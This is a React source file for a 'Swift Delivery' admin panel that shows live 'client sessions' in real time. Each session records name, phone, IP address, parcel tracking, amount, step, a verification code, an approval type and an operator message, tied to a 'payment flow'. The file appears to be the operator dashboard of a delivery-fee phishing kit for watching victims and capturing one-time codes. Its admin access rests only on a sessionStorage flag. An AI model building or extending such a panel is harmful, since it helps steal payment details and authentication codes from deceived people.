import { useEffect, useState, useMemo } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { 
  RefreshCw, 
  Users,
  LogOut,
  Settings,
  Search,
  X
} from "lucide-react";
import { toast } from "@/hooks/use-toast";
import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";
import AdminLogin from "@/components/AdminLogin";
import AdminSettings from "@/components/AdminSettings";
import { ClientCard } from "@/components/admin/ClientCard";

interface ClientSession {
  id: string;
  session_code: string;
  client_name: string | null;
  phone_number: string | null;
  current_step: number;
  parcel_tracking: string | null;
  amount: number | null;
  status: string | null;
  admin_message: string | null;
  message_type: string | null;
  verification_code: string | null;
  approval_type: string | null;
  client_ip: string | null;
  created_at: string;
  updated_at: string;
}

const AdminPanel = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [sessions, setSessions] = useState<ClientSession[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");

  // Filter sessions based on search query
  const filteredSessions = useMemo(() => {
    if (!searchQuery.trim()) return sessions;
    
    const query = searchQuery.toLowerCase().trim();
    return sessions.filter(session => 
      session.session_code?.toLowerCase().includes(query) ||
      session.client_name?.toLowerCase().includes(query) ||
      session.client_ip?.toLowerCase().includes(query) ||
      session.phone_number?.toLowerCase().includes(query)
    );
  }, [sessions, searchQuery]);

  // Check for existing admin session
  useEffect(() => {
    const adminAuth = sessionStorage.getItem("admin_authenticated");
    if (adminAuth === "true") {
      setIsAuthenticated(true);
    }
  }, []);

  const handleLogout = () => {
    sessionStorage.removeItem("admin_authenticated");
    sessionStorage.removeItem("admin_username");
    setIsAuthenticated(false);
    toast({
      title: "Logged out",
      description: "You have been logged out of the admin panel",
    });
  };

  const fetchSessions = async () => {
    const { data, error } = await supabase
      .from("client_sessions")
      .select("*")
      .eq("status", "active")
      .order("created_at", { ascending: false });

    if (error) {
      console.error("Error fetching sessions:", error);
      toast({
        title: "Error",
        description: "Failed to fetch client sessions",
        variant: "destructive"
      });
    } else {
      setSessions(data || []);
    }
    setLoading(false);
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchSessions();

      // Subscribe to realtime changes
      const channel = supabase
        .channel("client_sessions_changes")
        .on(
          "postgres_changes",
          {
            event: "*",
            schema: "public",
            table: "client_sessions"
          },
          () => {
            fetchSessions();
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    }
  }, [isAuthenticated]);

  if (!isAuthenticated) {
    return <AdminLogin onLogin={() => setIsAuthenticated(true)} />;
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-secondary text-secondary-foreground py-4 shadow-lg">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img 
                src={swiftDeliveryLogo} 
                alt="Swift Delivery" 
                className="h-8 object-contain"
              />
              <div>
                <h1 className="text-xl font-semibold">Admin Panel</h1>
                <p className="text-sm text-secondary-foreground/70">Client Control Dashboard</p>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-2 text-sm">
                <Users className="w-4 h-4" />
                <span>{sessions.length} active</span>
              </div>
              <Button 
                variant="outline" 
                size="sm" 
                onClick={fetchSessions}
                className="gap-2"
              >
                <RefreshCw className="w-4 h-4" />
                Refresh
              </Button>
              <Button 
                variant="ghost" 
                size="sm" 
                onClick={handleLogout}
                className="gap-2"
              >
                <LogOut className="w-4 h-4" />
                Logout
              </Button>
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        <Tabs defaultValue="clients" className="space-y-6">
          <TabsList className="grid w-full max-w-md grid-cols-2">
            <TabsTrigger value="clients" className="gap-2">
              <Users className="w-4 h-4" />
              Clients
            </TabsTrigger>
            <TabsTrigger value="settings" className="gap-2">
              <Settings className="w-4 h-4" />
              Settings
            </TabsTrigger>
          </TabsList>

          <TabsContent value="clients">
            {/* Search Bar */}
            <div className="relative mb-4 max-w-md">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <Input
                placeholder="Search by IP, name, session code, or phone..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-9 pr-9"
              />
              {searchQuery && (
                <button 
                  onClick={() => setSearchQuery("")}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground"
                >
                  <X className="w-4 h-4" />
                </button>
              )}
            </div>

            {loading ? (
              <div className="flex items-center justify-center py-20">
                <RefreshCw className="w-8 h-8 animate-spin text-muted-foreground" />
              </div>
            ) : sessions.length === 0 ? (
              <Card className="text-center py-20">
                <CardContent>
                  <Users className="w-16 h-16 mx-auto text-muted-foreground mb-4" />
                  <h2 className="text-xl font-semibold mb-2">No Active Clients</h2>
                  <p className="text-muted-foreground">
                    When clients start the payment flow, they will appear here.
                  </p>
                </CardContent>
              </Card>
            ) : filteredSessions.length === 0 ? (
              <Card className="text-center py-12">
                <CardContent>
                  <Search className="w-12 h-12 mx-auto text-muted-foreground mb-4" />
                  <h2 className="text-lg font-semibold mb-2">No Results Found</h2>
                  <p className="text-muted-foreground text-sm">
                    No clients match "{searchQuery}"
                  </p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
                {filteredSessions.map((session) => (
                  <ClientCard key={session.id} session={session} />
                ))}
              </div>
            )}
          </TabsContent>

          <TabsContent value="settings">
            <AdminSettings />
          </TabsContent>
        </Tabs>
      </main>
    </div>
  );
};

export default AdminPanel;
